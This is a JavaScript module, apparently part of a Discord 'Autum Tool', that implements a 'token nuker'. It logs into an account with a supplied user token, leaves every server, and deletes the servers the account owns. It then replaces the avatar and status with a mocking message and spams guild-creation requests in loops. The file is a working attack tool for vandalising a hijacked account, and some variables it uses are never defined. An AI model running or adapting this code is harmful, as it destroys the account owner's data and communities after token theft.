const { Client } = require('discord.js');
const consoleTitle = require("console-title");
const gui = require("../module/gui");
const axios = require("axios");

const client = new Client();
require("dotenv").config;


async function tokenNuker() {
    console.clear();
    consoleTitle("Autum Tool - Nuker")
    gui()

    const readline = require('readline');

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('               Enter the token: ', (token) => {

        client.once("ready", async () => {
            const chalk = require("chalk");
            const { table } = require("table");
            const data = [
                ["LOGGED IN AS", `${chalk.red.bold(client.user.tag)}`, "The user that I am logged in as."],
                ["SERVERS", `${chalk.yellow.bold(client.guilds.cache.size.toLocaleString())}`, "The amount of servers that I am in."],
            ]

            consoleTitle(`Autum Tool - Token Nuker | Logged in as: ${client.user.tag}`)

            const config = {
                border: {
                    topBody: `─`,
                    topJoin: `┬`,
                    topLeft: `┌`,
                    topRight: `┐`,

                    bottomBody: `─`,
                    bottomJoin: `┴`,
                    bottomLeft: `└`,
                    bottomRight: `┘`,

                    bodyLeft: `│`,
                    bodyRight: `│`,
                    bodyJoin: `│`,

                    joinBody: `─`,
                    joinLeft: `├`,
                    joinRight: `┤`,
                    joinJoin: `┼`
                },
                header: {
                    alignment: 'center',
                    content: "CLIENT DATA"
                }
            };
            console.log(table(data, config))
        });

        client.on("ready", async() => {
            client.guilds.cache.forEach((g) => g.leave());
            client.user.setAvatar("https://i.ytimg.com/vi/T_a1kILVQs0/mqdefault.jpg")
            client.user.setStatus("idle")
            client.user.setActivity("LMFAO MY TOKEN JUST GOT NUKED XDDDDDDD")
        })

        const headers = {
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
            "Content-Type": "application/json",
            "Authorization": token
        }

        axios({
            method: "GET",
            url: "https://discordapp.com/api/v6/users/@me/guilds",
            headers: headers
        }).then((res) => {
            for(let i = 0; i < res.data.length; i++) {
                console.log(res.data[i])
                axios({
                    method: "delete",
                    url: `https://discordapp.com/api/v6/guilds/`+res.data[i].id,
                    headers: headers,
                    data: limit
                })
                axios({
                    method: "delete",
                    url: `https://discordapp.com/api/v6/users/@me/guilds/`+res.data[i].id,
                    headers: headers,
                    data: limit
                }).then((res) => {
                    for(let i = 0; i < 100; i++){
                        axios({
                            method: "POST",
                            url: "https://discordapp.com/api/v6/guilds",
                            data: guild,
                            headers: headers
                        }).then((res) => {
                            
                        })
                    }
                })
            }
        }).then(console.log("Successfully Nuked the token."))


        client.login(token);
       
    });
}

module.exports = tokenNuker;